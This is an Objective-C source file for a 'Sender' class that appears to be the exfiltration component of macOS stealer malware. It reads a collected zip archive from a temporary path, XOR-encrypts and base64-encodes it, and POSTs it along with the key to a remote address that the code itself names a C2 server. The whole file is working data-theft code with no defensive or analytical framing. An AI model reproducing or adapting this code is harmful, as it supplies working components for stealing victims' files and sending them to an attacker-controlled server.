#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif

#import "Sender.h"
#import "Tools.h"
#import <Foundation/Foundation.h>
#import "globals.h"

@implementation Sender

- (void)sendData {

    NSString *c2Address = REMOTE_IP;
    NSString *key = [Tools generateRandomString:15];
    
    NSString *filePath = [TEMPORARY_PATH stringByAppendingString:@".zip"];
    NSData *zipData = [NSData dataWithContentsOfFile:filePath];
    
    if (!zipData) {
        DebugLog(@"Error reading file: %@", filePath);
        return;
    }

    NSData *encryptedData = [Tools xorEncryptDecrypt:[zipData mutableCopy] key:key];
    NSString *base64EncodedZipData = [encryptedData base64EncodedStringWithOptions:0];
    
    NSString *folderName = [TEMPORARY_PATH lastPathComponent];
    NSDictionary *jsonData = @{@"data": [NSString stringWithFormat:@"%@:%@:%@", base64EncodedZipData, key, folderName]};
    
    NSError *error;
    NSData *json = [NSJSONSerialization dataWithJSONObject:jsonData options:0 error:&error];
    
    if (error) {
        DebugLog(@"Error creating JSON: %@", error.localizedDescription);
        return;
    }
    
    NSString *jsonString = [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding];

    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    [self postDataToC2Server:c2Address jsonData:jsonString completion:^(BOOL success, NSError *error) {
        if (success) {
            DebugLog(@"Data posted successfully");
        } else {
            DebugLog(@"Failed to post data: %@", error.localizedDescription);
        }
        dispatch_semaphore_signal(sema);
    }];

    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
}

- (void)postDataToC2Server:(NSString *)c2Address jsonData:(NSString *)jsonData completion:(void (^)(BOOL success, NSError *error))completion {
    NSURL *url = [NSURL URLWithString:c2Address];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSData *bodyData = [jsonData dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:bodyData];

    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            if (completion) {
                completion(NO, error);
            }
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                if (completion) {
                    completion(YES, nil);
                }
            } else {
                if (completion) {
                    completion(NO, [NSError errorWithDomain:@"com.example.error" code:httpResponse.statusCode userInfo:nil]);
                }
            }
        }
    }];
    [task resume];
    
}




@end
